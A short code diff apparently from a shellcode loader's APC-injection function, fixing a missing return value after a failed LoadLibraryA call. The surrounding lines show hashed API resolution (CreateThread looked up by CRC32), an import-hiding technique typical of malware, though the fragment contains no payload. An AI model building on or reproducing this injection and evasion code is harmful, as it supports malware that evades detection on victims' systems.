@@ -63,7 +63,7 @@ BOOL ApcInjection( IN PBYTE pbPayload[], IN SIZE_T sPayloadSize ) {
         printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
         #endif // !DEBUG
         
-        return;
+        return FALSE;
     }
 
     fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_CRC32A );
